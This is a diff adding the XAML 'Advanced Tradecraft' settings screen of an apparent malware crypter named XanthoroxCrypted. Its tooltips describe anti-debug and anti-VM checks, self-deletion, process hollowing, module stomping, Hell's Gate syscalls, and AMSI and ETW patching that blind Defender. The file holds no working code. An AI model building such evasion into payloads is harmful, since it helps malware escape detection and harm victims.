@@ -1,0 +1,78 @@
+<UserControl x:Class="XanthoroxCrypted.Views.TradecraftView"
+             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
+             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
+             mc:Ignorable="d" 
+             d:DesignHeight="550" d:DesignWidth="800">
+    <UserControl.Resources>
+        <Style TargetType="CheckBox">
+            <Setter Property="Foreground" Value="{StaticResource Brush_TextMain}"/>
+            <Setter Property="FontSize" Value="14"/>
+            <Setter Property="Margin" Value="0,5"/>
+            <Setter Property="Cursor" Value="Hand"/>
+            <EventSetter Event="MouseEnter" Handler="CheckBox_MouseEnter"/>
+            <EventSetter Event="MouseLeave" Handler="CheckBox_MouseLeave"/>
+        </Style>
+        <Style TargetType="GroupBox">
+            <Setter Property="Foreground" Value="{StaticResource Brush_NeonCyan}"/>
+            <Setter Property="BorderBrush" Value="#3300F3FF"/>
+            <Setter Property="Margin" Value="0,0,0,15"/>
+            <Setter Property="Padding" Value="10"/>
+        </Style>
+    </UserControl.Resources>
+    
+    <Grid Margin="20">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/> <!-- Header -->
+            <RowDefinition Height="*"/>    <!-- Checkboxes -->
+            <RowDefinition Height="120"/>  <!-- Info Panel -->
+        </Grid.RowDefinitions>
+
+        <TextBlock Text="ADVANCED TRADECRAFT" Foreground="{StaticResource Brush_NeonCyan}" FontSize="18" FontWeight="Bold" Margin="0,0,0,20">
+            <TextBlock.Effect>
+                <DropShadowEffect Color="{StaticResource Color_NeonCyan}" BlurRadius="10" ShadowDepth="0" Opacity="0.4"/>
+            </TextBlock.Effect>
+        </TextBlock>
+
+        <ScrollViewer Grid.Row="1" VerticalScrollBarVisibility="Auto">
+            <StackPanel>
+                <GroupBox Header="Standard Evasion">
+                    <StackPanel>
+                        <CheckBox Content="Anti-Debug (PEB/Timing)" Tag="Detects and exits if a debugger (x64dbg, OllyDbg) is attached using PEB flags and RDTSC timing checks."/>
+                        <CheckBox Content="Anti-VM (Hardware)" Tag="Checks for virtualized hardware (MAC OUI, CPU Core Count, Disk Size) to detect sandboxes."/>
+                        <CheckBox Content="Melt File (Self-Destruct)" Tag="Securely deletes the original crypted file from disk after successful execution."/>
+                    </StackPanel>
+                </GroupBox>
+
+                <GroupBox Header="God Mode Execution (Polymorphic)">
+                    <StackPanel>
+                        <CheckBox Content="Process Hollowing (RunPE)" Tag="Unmaps the code section of a legitimate process (svchost.exe) and replaces it with your payload."/>
+                        <CheckBox Content="Fiber Injection (Invisible)" Tag="Uses Windows 'Fibers' (cooperative multitasking) to execute code. Invisible to thread-based scanners."/>
+                        <CheckBox Content="Module Stomping" Tag="Loads a legitimate DLL (e.g., d3d11.dll), wipes its text section, and places payload there. Memory appears backed by disk."/>
+                        <CheckBox Content="Indirect Syscalls (Hell's Gate)" Tag="Bypasses EDR hooks by reading the kernel syscall number directly from ntdll.dll and executing it manually."/>
+                    </StackPanel>
+                </GroupBox>
+
+                <GroupBox Header="The Silencer (Telemetry Killers)">
+                    <StackPanel>
+                        <CheckBox Content="AMSI Patching" Tag="Patches AmsiScanBuffer in memory to always return AMSI_RESULT_CLEAN. Blinds Defender runtime scanning."/>
+                        <CheckBox Content="ETW Blinding" Tag="Patches EtwEventWrite to stop the process from sending telemetry events to Windows."/>
+                    </StackPanel>
+                </GroupBox>
+            </StackPanel>
+        </ScrollViewer>
+
+        <!-- Interactive Description Panel -->
+        <Border Grid.Row="2" Background="#11FFFFFF" BorderBrush="{StaticResource Brush_NeonCyan}" BorderThickness="1" CornerRadius="5" Margin="0,10,0,0">
+            <Grid Margin="10">
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="*"/>
+                </Grid.RowDefinitions>
+                <TextBlock Text="MODULE INTELLIGENCE" FontWeight="Bold" Foreground="{StaticResource Brush_NeonCyan}" FontSize="12" Opacity="0.7"/>
+                <TextBlock x:Name="TxtInfo" Grid.Row="1" Text="Hover over a module to see technical details." Foreground="{StaticResource Brush_TextMain}" TextWrapping="Wrap" Margin="0,5,0,0" FontStyle="Italic"/>
+            </Grid>
+        </Border>
+    </Grid>
+</UserControl>
